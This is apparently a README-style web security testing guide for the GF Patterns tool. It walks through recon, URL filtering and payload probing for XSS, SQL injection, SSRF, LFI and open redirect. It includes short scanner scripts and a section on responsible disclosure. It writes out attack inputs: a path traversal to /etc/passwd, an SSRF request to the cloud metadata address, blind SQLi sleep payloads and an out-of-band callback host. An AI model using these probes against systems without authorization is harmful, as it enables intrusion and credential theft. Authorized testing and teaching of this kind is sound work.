# 🔐 Security Testing Guide

Master security testing with **GF Patterns** - From basics to advanced techniques.

---

## 🎯 Testing Methodology

### 1. Reconnaissance Phase
- **Subdomain enumeration**
- **Technology fingerprinting**
- **Endpoint discovery**
- **Parameter identification**

### 2. Vulnerability Discovery
- **Pattern matching**
- **Payload testing**
- **Response analysis**
- **Confirmation**

### 3. Exploitation & Reporting
- **Proof of concept**
- **Impact assessment**
- **Remediation guidance**

---

## 🗺️ Testing Workflow

### Phase 1: Target Analysis
```bash
# 1. Domain enumeration
subfinder -d target.com | tee domains.txt

# 2. Technology detection
httpx -l domains.txt -tech-detect | tee tech.txt

# 3. URL discovery
cat domains.txt | gau | tee urls.txt
```

### Phase 2: Vulnerability Scanning
```bash
# 1. XSS Testing
cat urls.txt | gf xss | tee xss_candidates.txt

# 2. SQL Injection
cat urls.txt | gf sqli | tee sqli_candidates.txt

# 3. SSRF Testing
cat urls.txt | gf ssrf | tee ssrf_candidates.txt

# 4. Full scan
./ultimate_hunt.sh target.com
```

### Phase 3: Validation
```bash
# 1. Test XSS payloads
cat xss_candidates.txt | xargs -I {} echo "{}<script>alert(1)</script>" | httpx -mr "alert(1)"

# 2. Test SQLi payloads
cat sqli_candidates.txt | xargs -I {} echo "{}' OR 1=1--" | httpx -mr "SQL syntax"

# 3. Test SSRF payloads
cat ssrf_candidates.txt | xargs -I {} echo "{}http://169.254.169.254" | httpx -mr "metadata"
```

---

## 🔍 Vulnerability Types

### 1. Cross-Site Scripting (XSS)

#### Reflected XSS
```bash
# Find reflected parameters
cat urls.txt | gf xss | grep -E "(\?|&)[a-zA-Z0-9_-]*="

# Test payloads
echo "https://target.com/search?q=" | gf xss | xargs -I {} echo "{}<script>alert('XSS')</script>"
```

#### Stored XSS
```bash
# Find input fields
cat urls.txt | gf xss | grep -E "(comment|message|feedback|post)"
```

#### DOM XSS
```bash
# Find JavaScript sinks
cat urls.txt | gf xss | grep -E "(#|javascript:|data:|vbscript:)"
```

### 2. SQL Injection

#### Error-based SQLi
```bash
# Find SQL injection points
cat urls.txt | gf sqli | xargs -I {} echo "{}'" | httpx -mr "SQL syntax|mysql_fetch|ORA-"
```

#### Union-based SQLi
```bash
# Test union injection
cat urls.txt | gf sqli | xargs -I {} echo "{} UNION SELECT 1,2,3--" | httpx -mr "The used SELECT"
```

#### Blind SQLi
```bash
# Time-based blind SQLi
cat urls.txt | gf sqli | xargs -I {} echo "{}' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" | httpx -timeout 10
```

### 3. Server-Side Request Forgery (SSRF)

#### Basic SSRF
```bash
# Find SSRF parameters
cat urls.txt | gf ssrf | grep -E "(url|link|redirect|callback|webhook)"
```

#### Blind SSRF
```bash
# Use Burp Collaborator or interactsh
cat urls.txt | gf ssrf | xargs -I {} echo "{}http://your-collaborator.com"
```

#### AWS Metadata SSRF
```bash
# Test AWS metadata access
cat urls.txt | gf ssrf | xargs -I {} echo "{}http://169.254.169.254/latest/meta-data/"
```

### 4. Local File Inclusion (LFI)

#### Basic LFI
```bash
# Find file parameters
cat urls.txt | gf lfi | grep -E "(file|path|document|page|template)"
```

#### Path Traversal
```bash
# Test path traversal
cat urls.txt | gf lfi | xargs -I {} echo "{}../../../etc/passwd" | httpx -mr "root:x:"
```

### 5. Open Redirect

#### Basic Redirect
```bash
# Find redirect parameters
cat urls.txt | gf redirect | grep -E "(redirect|return|continue|url|next)"
```

#### JavaScript Redirect
```bash
# Test JavaScript redirects
cat urls.txt | gf redirect | xargs -I {} echo "{}javascript:alert(1)"
```

---

## 🛠️ Advanced Techniques

### 1. Automation Scripts

#### Custom XSS Scanner
```bash
#!/bin/bash
# xss_scanner.sh
target=$1
subfinder -d $target | httpx | gau | gf xss | while read url; do
    payload="${url}<script>alert('XSS')</script>"
    response=$(curl -s "$payload")
    if [[ $response == *"alert('XSS')"* ]]; then
        echo "[+] XSS Found: $payload"
    fi
done
```

#### SQLi Detector
```bash
#!/bin/bash
# sqli_detector.sh
target=$1
subfinder -d $target | httpx | gau | gf sqli | while read url; do
    payload="${url}'"
    response=$(curl -s "$payload")
    if [[ $response == *"SQL syntax"* ]] || [[ $response == *"mysql_fetch"* ]]; then
        echo "[+] SQLi Found: $payload"
    fi
done
```

### 2. Rate Limiting & Throttling

#### Respectful Scanning
```bash
# Add delays between requests
cat urls.txt | xargs -I {} -P 5 -n 1 bash -c 'curl -s "{}"; sleep 1'

# Use httpx rate limiting
httpx -l urls.txt -rate-limit 100
```

### 3. Session Handling

#### Authenticated Testing
```bash
# Use cookies
httpx -l urls.txt -H "Cookie: session=your_session_cookie"

# Use authentication headers
httpx -l urls.txt -H "Authorization: Bearer your_token"
```

---

## 📊 Reporting

### 1. Vulnerability Report Template

#### Basic Structure
```markdown
# Vulnerability Report

## Summary
- **Target**: [target.com]
- **Vulnerability**: [XSS/SQLi/SSRF/etc.]
- **Severity**: [Critical/High/Medium/Low]
- **CVSS Score**: [X.X]

## Technical Details
- **URL**: [vulnerable URL]
- **Parameter**: [vulnerable parameter]
- **Payload**: [test payload]
- **Response**: [server response]

## Proof of Concept
[Step-by-step reproduction]

## Impact
[Business impact description]

## Remediation
[Fix recommendations]
```

### 2. Automated Reporting

#### Generate Report
```bash
# Create vulnerability report
./generate_report.sh target.com

# Output: reports/target.com_$(date +%Y%m%d).html
```

---

## 🎯 Testing Scenarios

### 1. E-commerce Testing

#### Cart Functionality
```bash
# Test cart parameters
cat urls.txt | gf xss | grep -E "(cart|product|item|price|quantity)"
```

#### Payment Processing
```bash
# Test payment parameters
cat urls.txt | gf sqli | grep -E "(payment|checkout|billing|card)"
```

### 2. API Testing

#### REST API
```bash
# Test API endpoints
cat api_urls.txt | gf sqli | grep -E "(api|v1|v2|rest)"
```

#### GraphQL
```bash
# Test GraphQL queries
cat graphql_urls.txt | gf sqli | grep -E "(query|mutation|graphql)"
```

### 3. Authentication Testing

#### Login Forms
```bash
# Test login parameters
cat urls.txt | gf sqli | grep -E "(login|username|password|email)"
```

#### Registration Forms
```bash
# Test registration parameters
cat urls.txt | gf xss | grep -E "(register|signup|create|new)"
```

---

## 🔒 Responsible Disclosure

### 1. Ethical Guidelines

#### Do's
- ✅ Get proper authorization
- ✅ Test only in scope
- ✅ Report findings promptly
- ✅ Provide remediation steps
- ✅ Respect rate limits

#### Don'ts
- ❌ Test without permission
- ❌ Exfiltrate sensitive data
- ❌ Cause service disruption
- ❌ Share vulnerabilities publicly
- ❌ Demand payment for disclosure

### 2. Disclosure Process

#### Steps
1. **Discovery** → Find vulnerability
2. **Verification** → Confirm exploitability
3. **Documentation** → Create detailed report
4. **Reporting** → Contact responsible party
5. **Follow-up** → Ensure remediation

---

## 📚 Learning Resources

### 1. Online Resources

#### Documentation
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Bugcrowd University](https://university.bugcrowd.com/)

#### Tools
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Nuclei Templates](https://nuclei.projectdiscovery.io/templating-guide/)
- [GF Patterns](https://github.com/tomnomnom/gf)

### 2. Practice Platforms

#### Legal Testing
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

## 🆘 Support

### Getting Help
- **Documentation**: [docs/](docs/)
- **Issues**: [GitHub Issues](https://github.com/your-repo/Gf-Patterns/issues)
- **Community**: [Discord](https://discord.gg/gf-patterns)

### Professional Services
- **Training**: Custom security training
- **Consulting**: Security assessment services
- **Support**: Technical support packages

---

<div align="center">

**🎓 Ready to become a security testing expert?**

**📖 Continue with [Pattern Documentation](PATTERNS.md)**

**🤝 Join our [Community Discord](https://discord.gg/gf-patterns)**

</div>